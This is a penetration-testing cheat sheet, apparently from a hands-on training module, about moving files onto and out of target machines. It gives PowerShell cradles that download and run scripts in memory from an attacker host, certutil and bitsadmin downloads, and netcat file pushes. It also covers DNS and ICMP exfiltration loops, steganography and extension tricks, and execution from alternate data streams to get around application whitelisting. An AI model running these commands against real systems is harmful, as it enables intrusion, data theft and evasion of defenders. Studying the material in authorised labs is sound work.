---
tags: [module/file-transfers, file-transfer, windows, linux, evasion, smb, ftp, http, dns, icmp, automation, level/advanced, practical]
---

# File Transfers - Practical Application

## Complete File Transfer Workflow

Phase 1: Reconnaissance (What's Allowed?)
Phase 2: HTTP/HTTPS Methods
Phase 3: SMB Methods
Phase 4: FTP Methods
Phase 5: SSH/SCP Methods
Phase 6: Netcat/Powercat Methods
Phase 7: DNS & ICMP Exfiltration
Phase 8: Evasion Techniques
Phase 9: Automation

---

## Phase 1: Reconnaissance - What's Allowed?

### Port Checking

# Test outbound ports
nc -zv target.com 80
nc -zv target.com 443
nc -zv target.com 445
nc -zv target.com 21
nc -zv target.com 22

### Protocol Checking

# Test HTTP
curl -I http://your-server.com/test

# Test HTTPS
curl -k -I https://your-server.com/test

# Test DNS
nslookup your-server.com

### Application Checking

# Check if PowerShell is available
powershell -Command "Get-ExecutionPolicy"

# Check if certutil is available
certutil -?

# Check if wget is available
wget --help

---

## Phase 2: HTTP/HTTPS Methods

### PowerShell Deep Dive

# Basic download
Invoke-WebRequest -Uri "http://10.10.14.5:8000/file.exe" -OutFile "C:\temp\file.exe"

# With authentication
$cred = Get-Credential
Invoke-WebRequest -Uri "https://internal.site/file.zip" -Credential $cred -OutFile file.zip

# Using WebClient
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/file.exe', 'file.exe')

# Download and execute in memory (no disk)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/script.ps1')

# Multiple files
$urls = @("http://server/file1.exe", "http://server/file2.dll")
$urls | ForEach-Object { (New-Object Net.WebClient).DownloadFile($_, "C:\temp\$(Split-Path $_ -Leaf)") }

### Certutil Variations

# Basic download
certutil -urlcache -f http://10.10.14.5:8000/file.exe file.exe

# Split file (bypass size limits)
certutil -split -f http://10.10.14.5:8000/largefile.bin largefile.bin

# Verify after download
certutil -hashfile file.exe MD5

### Bitsadmin

# Create download job
bitsadmin /transfer myjob /download /priority high http://10.10.14.5:8000/file.exe C:\temp\file.exe

# Monitor progress
bitsadmin /list

### Windows Curl (Windows 10+)

curl http://10.10.14.5:8000/file.exe -o file.exe

### Linux wget/curl

# wget with resume
wget -c http://10.10.14.5:8000/largefile.bin

# wget with authentication
wget --user=admin --password=pass ftp://10.10.14.5/file.zip

# curl with proxy
curl -x http://proxy:8080 -o file.exe http://10.10.14.5:8000/file.exe

---

## Phase 3: SMB Methods

### Impacket smbserver

# Simple share
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /path/to/files

# Share with authentication
python3 smbserver.py -username htb -password "HTB_@cademy_student!" share /path/to/files

# Access from Windows
net use \\10.10.14.5\share /user:htb "HTB_@cademy_student!"
copy \\10.10.14.5\share\file.exe C:\temp\

# Mount as drive
net use Z: \\10.10.14.5\share /persistent:yes

### Native SMB in Linux

# Mount Windows share
sudo mount -t cifs //10.10.14.5/share /mnt/smb -o username=htb,password=pass

# Upload file
cp localfile.exe /mnt/smb/

### SMB over HTTP (WebDAV)

# Mount WebDAV share
net use * https://webdav.server.com/folder

---

## Phase 4: FTP Methods

### Setting Up FTP Server

# Install vsftpd
sudo apt install vsftpd -y
sudo systemctl start vsftpd

# Configure vsftpd
sudo nano /etc/vsftpd.conf
anonymous_enable=YES
anon_root=/var/ftp

# Create FTP folder
sudo mkdir -p /var/ftp/uploads
sudo chmod 777 /var/ftp/uploads

### FTP from Windows

# Scripted FTP
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt

# Upload
echo put results.txt >> ftp_upload.txt
ftp -s:ftp_upload.txt

### FTP from Linux

# Download
wget ftp://10.10.14.5/file.exe

# Upload
curl -T file.exe ftp://10.10.14.5/ --user anonymous:

---

## Phase 5: SSH/SCP Methods

### Setting Up SSH Server

sudo apt install openssh-server -y
sudo systemctl start ssh

### SCP Commands

# Upload to target
scp /local/file user@target:/remote/path/

# Download from target
scp user@target:/remote/file /local/path/

# Recursive directory
scp -r /local/dir user@target:/remote/dir/

# With custom port
scp -P 2222 file user@target:/remote/

### SSH File Transfer (SFTP)

# Interactive session
sftp user@target

# Batch download
echo "get /remote/file" | sftp user@target

### Windows OpenSSH

# Install (Windows 10+)
Add-WindowsCapability -Online -Name OpenSSH.Client*

# Use scp
scp file user@target:/remote/

---

## Phase 6: Netcat/Powercat Methods

### Netcat File Transfer

# On receiving host (download)
nc -lvnp 4444 > received_file

# On sending host (target)
nc -v YOUR-IP 4444 < file_to_send

# Directory transfer
tar cf - /path/to/dir | nc -lvnp 4444
nc -v YOUR-IP 4444 | tar xf -

### Netcat with Progress

# Using pv (Linux)
tar cf - /path | pv | nc -lvnp 4444
nc -v YOUR-IP 4444 | pv | tar xf -

### Powercat (PowerShell version)

# Import powercat
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1')

# Send file
powercat -c YOUR-IP -p 4444 -i C:\file.exe

# Receive file
powercat -l -p 4444 -of C:\received.exe

### Netcat Relays

# Chain connections
nc -lvnp 4444 | nc target.com 80

---

## Phase 7: DNS & ICMP Exfiltration

### DNS Exfiltration (when only DNS allowed)

# Encode file to DNS-friendly format
base64 -w0 file.exe | sed 's/./&./g' > dns_chunks.txt

# Send via nslookup
for chunk in $(cat dns_chunks.txt); do
    nslookup $chunk.your-dns-server.com
    sleep 1
done

### DNS TXT Records

# Store data in TXT record
dig txt data.domain.com

### ICMP Exfiltration

# Using ping (data in packets)
ping -p $(xxd -p -c8 file) your-server.com

### Specialized Tools

# dnscat2 - DNS tunneling
# iodine - DNS tunnel
# hans - ICMP tunnel

---

## Phase 8: Evasion Techniques

### Split Large Files

# Split into chunks
split -b 10M largefile.exe part_

# Reassemble
cat part_* > largefile.exe

### Encrypt/Decrypt

# Encrypt with OpenSSL
openssl enc -aes-256-cbc -in file.exe -out file.enc -pass pass:secret

# Decrypt
openssl enc -d -aes-256-cbc -in file.enc -out file.exe -pass pass:secret

### Hide in Plain Sight

# Rename extensions
rename file.exe file.jpg

# Embed in image (steganography)
steghide embed -cf image.jpg -ef file.exe

### Use Living Off the Land Binaries

# Windows: certutil, bitsadmin, wmic
# Linux: wget, curl, scp, ftp
# Use what's already there

### Bypass Application Whitelisting

# Use alternative extensions
file.ps1 -> file.txt (then rename)
file.exe -> file.com

# Execute from alternate streams (Windows)
type file.exe > legit.txt:file.exe
start legit.txt:file.exe

---

## Phase 9: Automation

### Complete File Transfer Script

Save as file-transfer.sh:

#!/bin/bash
TARGET=$1
FILE=$2
METHOD=$3

case $METHOD in
    http)
        python3 -m http.server 8000
        echo "On target: iwr -uri http://$TARGET:8000/$FILE -OutFile $FILE"
        ;;
    smb)
        python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
        echo "On target: copy \\$TARGET\share\$FILE C:\temp\$FILE"
        ;;
    ftp)
        sudo systemctl start vsftpd
        sudo cp $FILE /srv/ftp/
        echo "On target: wget ftp://$TARGET/$FILE"
        ;;
    nc)
        nc -lvnp 4444 < $FILE
        echo "On target: nc -v $TARGET 4444 > $FILE"
        ;;
    base64)
        base64 -w0 $FILE
        echo "Copy base64 string and decode on target"
        ;;
    *)
        echo "Usage: $0 <target-ip> <file> <http|smb|ftp|nc|base64>"
        ;;
esac

### PowerShell Download Cradle Generator

Save as download-cradle.ps1:

$url = "http://10.10.14.5/file.exe"
$output = "C:\temp\file.exe"

$cradles = @(
    "(New-Object Net.WebClient).DownloadFile('$url', '$output')",
    "Invoke-WebRequest -Uri '$url' -OutFile '$output'",
    "Start-BitsTransfer -Source '$url' -Destination '$output'",
    "certutil -urlcache -f '$url' '$output'",
    "bitsadmin /transfer job /download /priority high '$url' '$output'"
)

Write-Host "Download Cradles for $url :" -ForegroundColor Green
$cradles | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }

---

## File Transfer Cheatsheet

| Method | Target | Command |
|--------|--------|---------|
| PowerShell download | Windows | iwr -uri http://10.10.14.5/file -OutFile file |
| Certutil | Windows | certutil -urlcache -f http://10.10.14.5/file file |
| Bitsadmin | Windows | bitsadmin /transfer job /download /priority high http://10.10.14.5/file C:\temp\file |
| wget | Linux | wget http://10.10.14.5/file -O /tmp/file |
| curl | Linux | curl -o /tmp/file http://10.10.14.5/file |
| SMB receive | Windows | copy \\10.10.14.5\share\file . |
| SMB send | Linux | python3 smbserver.py share . |
| FTP receive | Windows | ftp 10.10.14.5 > get file |
| FTP send | Linux | sudo cp file /srv/ftp/ |
| SCP | Linux | scp file user@target:/remote/ |
| Netcat receive | Both | nc -lvnp 4444 > file |
| Netcat send | Both | nc -v 10.10.14.5 4444 < file |
| Base64 | Both | base64 file; echo "string" | base64 -d > file |

---

## Key Takeaways

- Always test multiple methods - one WILL fail
- Check outbound ports first (80,443,445,21,22,53)
- SMB often works when HTTP doesn't
- PowerShell may be blocked - have alternatives ready
- Certutil is your friend on Windows
- Netcat works when nothing else does
- DNS exfiltration works when only DNS allowed
- Split large files to bypass size limits
- Encrypt sensitive files in transit
- Use living off the land binaries to avoid detection
- Automate your file transfer setup
- Practice ALL methods in the lab
- Real-world example: PowerShell blocked, FTP blocked, SMB saved the day
- The more methods you know, the less likely you'll get stuck
